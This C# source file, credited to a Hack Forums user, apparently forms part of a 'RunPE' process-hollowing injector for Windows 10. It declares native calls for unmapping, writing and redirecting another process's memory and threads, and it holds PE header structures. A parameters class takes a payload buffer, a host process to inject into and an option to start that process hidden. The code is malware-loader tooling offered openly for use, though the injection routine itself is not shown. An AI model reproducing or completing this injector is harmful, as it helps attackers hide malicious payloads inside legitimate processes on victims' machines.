using System;
using System.Runtime.InteropServices;

namespace HackForums.gigajew
{
    public unsafe class WinXComponents {
        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessInternal([MarshalAs(UnmanagedType.U4)]uint hToken,
                                 [MarshalAs(UnmanagedType.LPTStr)]string lpApplicationName,
                                 [MarshalAs(UnmanagedType.LPTStr)]string lpCommandLine,
                                 [MarshalAs(UnmanagedType.SysInt)]IntPtr lpProcessAttributes,
                                 [MarshalAs(UnmanagedType.SysInt)]IntPtr lpThreadAttributes,
                                 [MarshalAs(UnmanagedType.Bool)]bool bInheritHandles,
                                 [MarshalAs(UnmanagedType.U4)]uint dwCreationFlags,
                                 [MarshalAs(UnmanagedType.SysInt)]IntPtr lpEnvironment,
                                 [MarshalAs(UnmanagedType.LPTStr)]string lpCurrentDirectory,
                                 byte[] lpStartupInfo,
                                 ProcessInfo* lpProcessInfo,
                                 [MarshalAs(UnmanagedType.U4)]uint hNewToken);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool TerminateProcess([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.I4)]int exitCode);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle([MarshalAs(UnmanagedType.SysInt)]IntPtr hObject);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool Wow64GetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool Wow64SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT* pContext);

        [DllImport("ntdll.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        public static extern uint NtUnmapViewOfSection([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.SysInt)]
        public static extern IntPtr VirtualAllocEx([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
                                                    [MarshalAs(UnmanagedType.SysInt)]IntPtr lpAddress,
                                                    [MarshalAs(UnmanagedType.U4)]uint dwSize,
                                                    [MarshalAs(UnmanagedType.U4)]uint flAllocationType,
                                                    [MarshalAs(UnmanagedType.U4)]uint flProtect);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool WriteProcessMemory([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
                                                        [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress,
                                                        [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBuffer,
                                                        [MarshalAs(UnmanagedType.U4)]uint nSize,
                                                        [MarshalAs(UnmanagedType.SysInt)]IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        public static extern uint ResumeThread([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)]ref bool isWow64);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT_AMD64* pContext);

        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT_AMD64* pContext);
    }
    
    /// <summary>
    /// This RunPE was created by gigajew @ www.hackforums.net for Windows 10 x64
    /// Please leave these credits as a reminder of all the hours of work put into this
    /// </summary>
    public class WinXParameters
    {
        public byte[] Payload
        {
            get { return _payload; }
            protected set { _payload = value; }
        }

        public string TargetProcess
        {
            get { return _targetProcess; }
            protected set { _targetProcess = value; }
        }

        public string[] Arguments
        {
            get { return _arguments; }
            protected set { _arguments = value; }
        }

        public bool Hidden
        {
            get { return _hidden; }
            protected set { _hidden = value; }
        }

        private WinXParameters() : base()
        {
        }

        /// <summary>
        /// Create parameters for the WinX Injector
        /// </summary>
        /// <param name="payload">Your payload buffer</param>
        /// <param name="targetProcess">The absolute or relative path of your target process (the host)</param>
        /// <param name="hidden">Start the process hidden</param>
        /// <param name="arguments">Optional arguments to pass to the payload</param>
        /// <returns>The parameter object</returns>
        public static WinXParameters Create(byte[] payload, string targetProcess, bool hidden, params string[] arguments)
        {
            WinXParameters parameters = new WinXParameters();
            parameters.TargetProcess = targetProcess;
            parameters.Payload = payload;
            parameters.Arguments = arguments;
            parameters.Hidden = hidden;
            return parameters;
        }

        public string GetFormattedHostFileName()
        {
            if (Arguments != null)
            {
                if (Arguments.Length > 0)
                {
                    return string.Format("{0} {1}", TargetProcess, string.Join(" ", Arguments));
                }
            }

            return TargetProcess;
        }

        private byte[] _payload;
        private string _targetProcess;
        private string[] _arguments;
        private bool _hidden;
    }

    #region "Shared"
    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInfo
    {
        public IntPtr hProcess;
        public IntPtr hThread;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x28)]
    public struct _IMAGE_SECTION_HEADER
    {
        [FieldOffset(0xc)]
        public UInt32 VirtualAddress;

        [FieldOffset(0x10)]
        public UInt32 SizeOfRawData;

        [FieldOffset(0x14)]
        public UInt32 PointerToRawData;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x14)]
    public struct _IMAGE_FILE_HEADER
    {
        [FieldOffset(0x02)]
        public ushort NumberOfSections;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x40)]
    public struct _IMAGE_DOS_HEADER
    {
        [FieldOffset(0x00)]
        public ushort e_magic;

        [FieldOffset(0x3c)]
        public uint e_lfanew;
    }
    #endregion

    #region "AMD64"
    [StructLayout(LayoutKind.Explicit, Size = 0x108)]
    public struct _IMAGE_NT_HEADERS64
    {
        [FieldOffset(0x00)]
        public uint Signature;

        [FieldOffset(0x04)]
        public _IMAGE_FILE_HEADER FileHeader;

        [FieldOffset(0x18)]
        public _IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0xf0)]
    public struct _IMAGE_OPTIONAL_HEADER64
    {
        [FieldOffset(0x00)]
        public ushort Magic;

        [FieldOffset(0x010)]
        public uint AddressOfEntryPoint;

        [FieldOffset(0x18)]
        public ulong ImageBase;

        [FieldOffset(0x38)]
        public uint SizeOfImage;

        [FieldOffset(0x3c)]
        public uint SizeOfHeaders;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x4d0)]
    public struct _CONTEXT_AMD64
    {
        [FieldOffset(0x30)]
        public uint ContextFlags;

        [FieldOffset(0x80)]
        public ulong Rcx;

        [FieldOffset(0x88)]
        public ulong Rdx;
    }

    #endregion

    #region "i386"
    [StructLayout(LayoutKind.Explicit, Size = 0xf8)]
    public struct _IMAGE_NT_HEADERS
    {
        [FieldOffset(0x00)]
        public uint Signature;

        [FieldOffset(0x04)]
        public _IMAGE_FILE_HEADER FileHeader;

        [FieldOffset(0x18)]
        public _IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0xe0)]
    public struct _IMAGE_OPTIONAL_HEADER
    {
        [FieldOffset(0x00)]
        public ushort Magic;

        [FieldOffset(0x010)]
        public uint AddressOfEntryPoint;

        [FieldOffset(0x1c)]
        public uint ImageBase;

        [FieldOffset(0x38)]
        public uint SizeOfImage;

        [FieldOffset(0x3c)]
        public uint SizeOfHeaders;
    }

    [StructLayout(LayoutKind.Explicit, Size = 0x2cc)]
    public struct _CONTEXT
    {
        [FieldOffset(0x00)]
        public uint ContextFlags;

        [FieldOffset(0xa4)]
        public uint Ebx;

        [FieldOffset(0xb0)]
        public uint Eax;
    }
    #endregion
}
